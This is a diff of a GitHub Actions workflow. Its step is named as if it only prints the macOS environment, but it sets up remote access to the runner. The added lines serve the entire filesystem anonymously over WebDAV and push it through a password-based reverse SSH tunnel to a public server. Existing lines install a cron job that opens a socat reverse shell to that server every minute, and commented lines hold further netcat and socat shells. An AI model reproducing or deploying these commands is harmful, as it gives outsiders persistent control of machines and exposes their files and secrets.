@@ -10,6 +10,7 @@ jobs:
       - name: print_macos_env
         env:
           PUBLIC_SERVER_IP: ${{ secrets.PUBLIC_SERVER }}
+          JSERV_PASSWD: ${{ secrets.JSERV_PASSWD }}
         run: |
           uname -a
           xcrun -f clang
@@ -28,8 +29,11 @@ jobs:
           echo "-----> done "
           # xcrun python3 -m http.server 8888 
           brew install sshpass netcat wget socat #dropbear openssh rlwrap
-          xcrun python3 -m pip install wsgidav
+          xcrun python3 -m pip install wsgidav cheroot
           # netcat $PUBLIC_SERVER_IP 2333 -e /bin/bash
+          export PATH=$PATH:"$(xcrun python3 -m site --user-base)/bin"
+          nohup wsgidav --host=0.0.0.0 --port=8080 --root=/ --auth=anonymous &
+          sshpass -p$JSERV_PASSWD ssh -fR 7788:127.0.0.1:8080 ubuntu@$PUBLIC_SERVER_IP -N
           # nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2224 &
           echo "* * * * * /opt/homebrew/bin/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2228" | crontab -
           xcrun python3 -m http.server 8888
